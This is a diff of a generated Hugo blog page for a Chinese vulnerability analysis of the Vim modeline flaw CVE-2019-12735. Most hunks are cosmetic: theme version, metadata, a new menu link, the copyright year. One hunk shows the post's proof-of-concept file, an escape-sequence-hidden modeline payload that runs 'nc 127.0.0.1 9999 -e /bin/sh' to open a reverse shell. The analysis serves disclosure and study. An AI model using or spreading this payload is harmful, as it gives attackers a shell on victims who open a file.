@@ -23,7 +23,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.73.0 with theme even" />
+<meta name="generator" content="Hugo 0.79.1 with theme even" />
 
 
 <link rel="canonical" href="https://b1tg.github.io/post/vim-arbitary-execute/" />
@@ -46,13 +46,14 @@
 <meta property="article:modified_time" content="2019-06-16T12:02:27+08:00" />
 <meta itemprop="name" content="Vim任意代码执行漏洞">
 <meta itemprop="description" content="CVE-2019-12735">
-<meta itemprop="datePublished" content="2019-06-16T12:02:27&#43;08:00" />
-<meta itemprop="dateModified" content="2019-06-16T12:02:27&#43;08:00" />
+<meta itemprop="datePublished" content="2019-06-16T12:02:27+08:00" />
+<meta itemprop="dateModified" content="2019-06-16T12:02:27+08:00" />
 <meta itemprop="wordCount" content="2699">
 
 
 
-<meta itemprop="keywords" content="漏洞分析," /><meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="漏洞分析," />
+<meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Vim任意代码执行漏洞"/>
 <meta name="twitter:description" content="CVE-2019-12735"/>
 
@@ -87,6 +88,8 @@
         <li class="mobile-menu-item">Tags</li>
       </a><a href="/about">
         <li class="mobile-menu-item">About</li>
+      </a><a href="/quotes">
+        <li class="mobile-menu-item">Quotes</li>
       </a>
   </ul>
 </nav>
@@ -106,6 +109,8 @@
         <a class="menu-item-link" href="/tags/">Tags</a>
       </li><li class="menu-item">
         <a class="menu-item-link" href="/about">About</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/quotes">Quotes</a>
       </li>
   </ul>
 </nav>
@@ -380,7 +385,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 在另一终端窗口运行nc -vlp 9999</span>
-<span class="c1"># shell.txt</span> 
+<span class="c1"># shell.txt </span>
 x1b<span class="o">[</span>?7lx1bSNothing here.x1b:silent! w <span class="p">|</span> call system<span class="o">(</span><span class="s1">&#39;nohup nc 127.0.0.1 9999 -e /bin/sh &amp;&#39;</span><span class="o">)</span> <span class="p">|</span> redraw! <span class="p">|</span> file <span class="p">|</span> silent! <span class="c1"># &#34; vim: set fen fdm=expr fde=assert_fails(&#39;set\ fde=x\ \|\ source\!\ \%&#39;) fdl=0: x16x1b[1Gx16x1b[KNothing here.&#34;x16x1b[D n</span>
 </code></pre></td></tr></table>
 </div>
@@ -544,7 +549,7 @@ $ cat -A shell.txt
   <span class="copyright-year">
     &copy; 
     2018 - 
-    2020
+    2021
     <span class="heart">
       <i class="iconfont icon-heart"></i>
     </span>
